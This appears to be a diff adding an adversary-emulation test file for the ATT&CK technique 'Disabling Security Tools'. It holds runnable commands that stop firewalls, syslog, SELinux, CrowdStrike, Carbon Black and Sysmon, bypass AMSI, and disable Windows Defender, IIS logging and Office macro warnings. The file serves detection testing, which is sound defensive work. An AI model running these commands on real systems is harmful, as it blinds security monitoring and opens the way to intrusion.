@@ -1,0 +1,386 @@
+attack_technique:
+- T1562.001
+display_name: Disabling Security Tools
+atomic_tests:
+- name: Disable iptables firewall
+  description: |
+    Disables the iptables firewall
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+      then
+        service iptables stop
+        chkconfig off iptables
+        service ip6tables stop
+        chkconfig off ip6tables
+      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+        systemctl stop firewalld
+        systemctl disable firewalld
+      fi
+    name: sh
+- name: Disable syslog
+  description: |
+    Disables syslog collection
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+      then
+        service rsyslog stop
+        chkconfig off rsyslog
+      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+        systemctl stop rsyslog
+        systemctl disable rsyslog
+      fi
+    name: sh
+- name: Disable Cb Response
+  description: |
+    Disable the Cb Response service
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+      then
+        service cbdaemon stop
+        chkconfig off cbdaemon
+      else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+        systemctl stop cbdaemon
+        systemctl disable cbdaemon
+      fi
+    name: sh
+- name: Disable SELinux
+  description: |
+    Disables SELinux enforcement
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      setenforce 0
+    name: sh
+- name: Stop Crowdstrike Falcon on Linux
+  description: |
+    Stop and disable Crowdstrike Falcon on Linux
+  supported_platforms:
+  - linux
+  executor:
+    command: |
+      sudo systemctl stop falcon-sensor.service
+      sudo systemctl disable falcon-sensor.service
+    cleanup_command: |
+      sudo systemctl enable falcon-sensor.service
+      sudo systemctl start falcon-sensor.service
+    name: sh
+    elevation_required: true
+- name: Disable Carbon Black Response
+  description: |
+    Disables Carbon Black Response
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+    name: sh
+- name: Disable LittleSnitch
+  description: |
+    Disables LittleSnitch
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+    name: sh
+- name: Disable OpenDNS Umbrella
+  description: |
+    Disables OpenDNS Umbrella
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+    name: sh
+- name: Stop and unload Crowdstrike Falcon on macOS
+  description: |
+    Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS
+  supported_platforms:
+  - macos
+  input_arguments:
+    falcond_plist:
+      description: The path of the Crowdstrike Falcon plist file
+      type: path
+      default: /Library/LaunchDaemons/com.crowdstrike.falcond.plist
+    userdaemon_plist:
+      description: The path of the Crowdstrike Userdaemon plist file
+      type: path
+      default: /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
+  executor:
+    command: |
+      sudo launchctl unload #{falcond_plist}
+      sudo launchctl unload #{userdaemon_plist}
+    name: sh
+    elevation_required: true
+- name: Unload Sysmon Filter Driver
+  description: |
+    Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
+    run the prereq_command's and it should fail with an error of "sysmon filter must be loaded".
+  supported_platforms:
+  - windows
+  input_arguments:
+    sysmon_driver:
+      description: The name of the Sysmon filter driver (this can change from the default)
+      type: string
+      default: SysmonDrv
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Sysmon must be downloaded
+    prereq_command: |
+      if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
+      Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
+      Remove-Item $env:TEMP\Sysmon.zip -Force
+  - description: |
+      sysmon must be Installed
+    prereq_command: |
+      if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
+      { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
+  - description: |
+      sysmon filter must be loaded
+    prereq_command: |
+      if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      sysmon -u
+      sysmon -accepteula -i
+  executor:
+    command: |
+      fltmc.exe unload #{sysmon_driver}
+    cleanup_command: |
+      sysmon -u -i > nul 2>&1
+      sysmon -i -accepteula -i > nul 2>&1
+      %temp%\Sysmon\sysmon.exe -u > nul 2>&1
+      %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Disable Windows IIS HTTP Logging
+  description: |
+    Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
+    This action requires HTTP logging configurations in IIS to be unlocked.
+  supported_platforms:
+  - windows
+  input_arguments:
+    website_name:
+      description: The name of the website on a server
+      type: string
+      default: Default Web Site
+  executor:
+    command: |
+      C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
+    cleanup_command: |
+      C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:false
+    name: powershell
+- name: Uninstall Sysmon
+  description: |
+    Uninstall Sysinternals Sysmon for Defense Evasion
+  supported_platforms:
+  - windows
+  input_arguments:
+    sysmon_exe:
+      description: The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)
+      type: Path
+      default: PathToAtomicsFolder\T1089\bin\sysmon.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Sysmon executable must be available
+    prereq_command: |
+      if(cmd /c where sysmon) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{sysmon_exe}"; $zippath = "$parentpath\Sysmon.zip"
+      New-Item -ItemType Directory $parentpath -Force | Out-Null
+      Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$zippath"
+      Expand-Archive $zippath $parentpath -Force; Remove-Item $zippath
+      if(-not ($Env:Path).contains($parentpath)){$Env:Path += ";$parentpath"}
+  - description: |
+      Sysmon must be installed
+    prereq_command: |
+      if(cmd /c sc query sysmon) { exit 0} else { exit 1}
+    get_prereq_command: |
+      cmd /c sysmon -i -accepteula
+  executor:
+    command: |
+      sysmon -u
+    cleanup_command: |
+      sysmon -i -accepteula >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: AMSI Bypass - AMSI InitFailed
+  description: |
+    Any easy way to bypass AMSI inspection is it patch the dll in memory setting the "amsiInitFailed" function to true.
+    Upon execution, no output is displayed.
+
+    https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    cleanup_command: |
+      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+    name: powershell
+- name: AMSI Bypass - Remove AMSI Provider Reg Key
+  description: |
+    With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
+    This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
+    Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
+    cleanup_command: |
+      New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
+    name: powershell
+    elevation_required: true
+- name: Disable Arbitrary Security Windows Service
+  description: |
+    With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.
+    Change the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.
+    To verify that the service has stopped, run "sc query McAfeeDLPAgentService"
+  supported_platforms:
+  - windows
+  input_arguments:
+    service_name:
+      description: The name of the service to stop
+      type: String
+      default: McAfeeDLPAgentService
+  executor:
+    command: |
+      net.exe stop #{service_name}
+      sc.exe config #{service_name} start= disabled
+    cleanup_command: |
+      sc.exe config #{service_name} start= auto >nul 2>&1
+      net.exe start #{service_name} >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Tamper with Windows Defender ATP PowerShell
+  description: |
+    Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
+    in Windows settings.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Set-MpPreference -DisableRealtimeMonitoring 1
+      Set-MpPreference -DisableBehaviorMonitoring 1
+      Set-MpPreference -DisableScriptScanning 1
+      Set-MpPreference -DisableBlockAtFirstSeen 1
+    cleanup_command: |
+      Set-MpPreference -DisableRealtimeMonitoring 0
+      Set-MpPreference -DisableBehaviorMonitoring 0
+      Set-MpPreference -DisableScriptScanning 0
+      Set-MpPreference -DisableBlockAtFirstSeen 0
+    name: powershell
+    elevation_required: true
+- name: Tamper with Windows Defender Command Prompt
+  description: |
+    Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
+    However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, "Access Denied"
+    will be displayed twice and the WinDefend service status will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      sc stop WinDefend
+      sc config WinDefend start=disabled
+      sc query WinDefend
+    cleanup_command: |
+      sc start WinDefend >nul 2>&1
+      sc config WinDefend start=enabled >nul 2>&1
+    name: command_prompt
+    elevation_required: true
+- name: Tamper with Windows Defender Registry
+  description: |
+    Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
+    grayed out and have no info.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1
+    cleanup_command: |
+      Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0
+    name: powershell
+    elevation_required: true
+- name: Disable Microft Office Security Features
+  description: |
+    Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
+    show any warning before editing the document.
+
+
+    https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel"
+      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security"
+      New-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings" -Value "1" -PropertyType "Dword"
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableInternetFilesInPV" -Value "1" -PropertyType "Dword"
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableUnsafeLocationsInPV" -Value "1" -PropertyType "Dword"
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView" -Name "DisableAttachementsInPV" -Value "1" -PropertyType "Dword"
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAWarnings"
+      Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
+    name: powershell
+- name: Remove Windows Defender Definition Files
+  description: |
+    Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
+    On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
+    command will say completed.
+
+    https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+    name: command_prompt
+    elevation_required: true
+- name: Stop and Remove Arbitrary Security Windows Service
+  description: |
+    Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.
+  supported_platforms:
+  - windows
+  input_arguments:
+    service_name:
+      description: The name of the service to remove
+      type: String
+      default: McAfeeDLPAgentService
+  executor:
+    command: |
+      Stop-Service -Name #{service_name}
+      Remove-Service -Name #{service_name}
+    name: powershell
+    elevation_required: true
+- name: Uninstall Crowdstrike Falcon on Windows
+  description: |
+    Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.
+  supported_platforms:
+  - windows
+  input_arguments:
+    falcond_path:
+      description: The Crowdstrike Windows Sensor path. The Guid always changes.
+      type: path
+      default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe
+  executor:
+    command: if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall /quiet } else { Get-ChildItem -Path "C:\ProgramData\Package Cache" -Include "WindowsSensor.exe" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq "Valid" -and $sig.SignerCertificate.DnsNameList -eq "CrowdStrike, Inc.") { . "$_" /repair /uninstall /quiet; break;}}}
+    name: powershell
+    elevation_required: true
+
